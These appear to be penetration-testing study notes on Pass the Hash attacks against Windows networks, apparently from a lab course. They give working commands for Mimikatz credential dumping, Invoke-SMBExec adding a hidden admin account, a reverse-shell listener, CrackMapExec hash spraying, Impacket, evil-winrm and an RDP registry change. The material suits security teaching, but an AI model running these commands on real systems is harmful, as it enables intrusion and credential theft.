In [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack we use the hash for authentication instead of the password.

Several ways to extract hashes (with administrative privileges):
- Dumping the local SAM database from a compromised host ([[Attacking SAM]]).
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller ([[Attacking Active Directory & NTDS.dit]]).
- Pulling the hashes from memory (lsass.exe) ([[Attacking LSASS]]).

## Windows NTLM Introduction

Microsoft's [Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

Even though flawed, NTLM is commonly used for compatibility purposes, Kerberos is the default authentication mechanism since Windows 2000 AD domain.

With NTLM password stored on the server and domain controller are not salted, which means we can authenticate with the hash without knowing the original password.

## Pass the Hash with Mimikatz (Windows)

### Dump hashes in memory
```cmd-session
C:\tools>mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

The `sekurlsa::pth` model is used to perform PtH attack by starting a process using the hash of the user's password, to use the model we will need the following:
- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

### Pass the Hash from Windows Using Mimikatz
```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /[rc4 | NTLM]:<rc4 or NTLM hash> /domain:<domain> /run:cmd.exe" exit
```

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) is a collection of PowerShell functions for performing pass the hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.

Parameters needed to execute commands in the target system:
- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

### Invoke-TheHash with SMB
```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target <hostname or IP address> -Domain <domain> -Username <username> -Hash <hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

We can also use it to get a reverse shell.

### Netcat Listener from our Windows Machine
```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001
```

We can use [https://www.revshells.com/](https://www.revshells.com/) to create a simple reverse shell using PowerShell, we should set our IP, port and select the option `PowerShell #3 (Base64)`.

![[pth_invoke_the_hash.jpg]]

## Pass the Hash with Impacket (Linux)

### Pass the Hash with Impacket PsExec
```shell-session
$ impacket-psexec <username>@<target ip> -hashes :<hash>
```

Other tools we can use for command execution using pass the hash attack:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## Pass the Hash with CrackMapExec (Linux)

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can also try it for several host, this is called password spraying and can lock out accounts.

### Pass the Hash with CrackMapExec
```shell-session
# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>
```

We can add `--local-auth` to our command to try and login locally to hosts, there can be a password reuse for local admin accounts, to protect against it we can [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) for randomization and rotation.

### CrackMapExec - Command Execution
```shell-session
# crackmapexec smb <ip address> -u Administrator -d . -H <hash> -x whoami
```

## Pass the Hash with evil-winrm (Linux)

If SMB is blocked or we don't have administrative rights, we can use this protocol.

### Pass the Hash with evil-winrm
```shell-session
$ evil-winrm -i <ip address> -u Administrator -H <hash>
```

**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)

`Restricted Admin Mode` if disabled will cause an error when trying this attack, it's disabled by default and can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.

### Enable Restricted Admin Mode to Allow PtH
```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Pass the Hash Using RDP
```shell-session
$ xfreerdp  /v:<ip address> /u:<username> /pth:<hash>
```

## UAC Limits Pass the Hash for Local Accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.